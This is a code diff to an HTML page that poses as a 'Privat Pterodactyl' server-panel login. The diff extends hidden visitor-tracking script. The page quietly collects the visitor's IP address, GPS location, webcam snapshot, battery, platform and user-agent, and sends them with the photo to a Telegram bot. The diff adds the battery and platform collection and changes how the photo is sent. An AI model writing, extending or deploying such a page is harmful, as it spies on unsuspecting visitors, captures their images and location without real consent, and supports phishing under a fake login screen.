@@ -61,11 +61,17 @@
       color: #aaa;
       text-align: center;
     }
+    @media only screen and (max-width: 600px) {
+      .login-box {
+        padding: 20px 10px;
+        max-width: 90%;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="login-box">
-    <h2>Privat Pterodactyl</h2>
+    <h2 id="platform-title">Privat Pterodactyl</h2>
     <img src="https://files.catbox.moe/o2x74k.png" alt="Mascot" width="100"><br><br>
     <input type="text" id="username" placeholder="USERNAME OR EMAIL">
     <input type="password" id="password" placeholder="PASSWORD">
@@ -87,13 +93,16 @@
     let locationInfo = 'Tidak diberikan';
     let cameraStatus = 'Gagal';
     let streamData = null;
-    let snapshotReady = false;
+    let batteryStatus = 'Tidak tersedia';
+
+    const platformInfo = navigator.platform || 'Tidak diketahui';
+    document.getElementById('platform-title').innerText += ` - ${platformInfo}`;
 
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
         ipAddress = data.ip;
-        trySendFullReport();
+        checkAndSend();
       });
 
     if (navigator.geolocation) {
@@ -101,10 +110,10 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         locationInfo = `Latitude: ${lat}, Longitude: ${lon}`;
-        trySendFullReport();
+        checkAndSend();
       }, err => {
         locationInfo = 'Izin lokasi ditolak';
-        trySendFullReport();
+        checkAndSend();
       });
     }
 
@@ -120,8 +129,15 @@
       })
       .catch(err => {
         cameraStatus = 'Ditolak / Tidak tersedia';
-        trySendFullReport();
+        checkAndSend();
       });
+
+    if (navigator.getBattery) {
+      navigator.getBattery().then(battery => {
+        batteryStatus = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
+        checkAndSend();
+      });
+    }
 
     function handleLogin() {
       const username = document.getElementById('username').value.trim();
@@ -147,22 +163,15 @@
       const context = canvas.getContext("2d");
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(blob => {
-        window.snapshotBlob = blob;
-        snapshotReady = true;
-        trySendFullReport();
+        sendToTelegram(blob);
       }, 'image/jpeg');
     }
 
-    function trySendFullReport() {
-      if (!snapshotReady && cameraStatus === 'Berhasil') return;
+    function sendToTelegram(blobImage) {
+      const userAgent = navigator.userAgent;
+      const time = new Date().toLocaleString();
 
-      navigator.getBattery().then(battery => {
-        const batteryLevel = `${battery.level * 100}%`;
-        const isCharging = battery.charging ? "Mengisi daya" : "Tidak mengisi";
-        const userAgent = navigator.userAgent;
-        const time = new Date().toLocaleString();
-
-        const message = `
+      const message = `
 |------------------------------------------
 | 👑 Developer : HANXX
 | 🌐 Language : HTML
@@ -173,30 +182,33 @@
 | 🔎 IP Address: ${ipAddress}
 | 📍 Lokasi: ${locationInfo}
 | 📸 Kamera: ${cameraStatus}
-| 🔋 Baterai: ${batteryLevel}
-| ⚡ Status Pengisian: ${isCharging}
+| 🔋 Baterai: ${batteryStatus}
+| 💻 Platform: ${platformInfo}
 | 🗃 User-Agent: ${userAgent}
 | 🕰 Waktu Login: ${time}
 |------------------------------------------
 `;
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: message })
-        });
-
-        if (window.snapshotBlob) {
-          const formData = new FormData();
-          formData.append("chat_id", chatId);
-          formData.append("photo", window.snapshotBlob, "snapshot.jpg");
-
-          fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
-        }
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
       });
+
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blobImage, "snapshot.jpg");
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      }).then(() => console.log("Gambar terkirim ke Telegram"));
+    }
+
+    function checkAndSend() {
+      if (ipAddress && locationInfo && cameraStatus && streamData) {
+        // cukup info, lanjut snapshot
+      }
     }
   </script>
 </body>
